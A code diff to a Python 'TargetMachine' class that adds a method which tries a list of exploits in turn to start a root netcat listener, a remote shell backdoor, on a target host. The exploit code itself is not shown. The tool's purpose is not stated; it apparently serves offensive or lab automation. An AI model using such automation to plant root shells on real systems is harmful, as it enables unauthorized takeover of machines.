@@ -68,5 +68,23 @@ class TargetMachine:
 			logger.info(f"{COLOR_OKGREEN}{self.ip_address} - A root netcat server is running on the target machine!{COLOR_END}")
 			return True
 		except Exception:
-			logger.info(f"{COLOR_FAIL}{self.ip_address} - A root netcat server is not currently running on the target machine.{COLOR_END}")
+			logger.info(f"{self.ip_address} - A root netcat server is not currently running on the target machine.{COLOR_END}")
 			return False
+
+	def start_root_netcat_server(self):
+		"""
+		Starts a root netcat server if one is not already running
+		"""
+		port=self.parsed_config["root_netcat_server_port"]
+		if self.check_if_root_netcat_server_is_running():
+			return True
+		logger.info(f"{self.ip_address} - Starting a root netcat server on the target machine...")
+		for exploit in self.exploits:
+			try:
+				started_root_netcat_server = exploit.start_root_netcat_server(port=port)
+				if started_root_netcat_server:
+					return True
+			except Exception:
+				continue
+		logger.info(f"{COLOR_FAIL}Failed to start a root netcat server on port {port}!{COLOR_END}")
+		return False
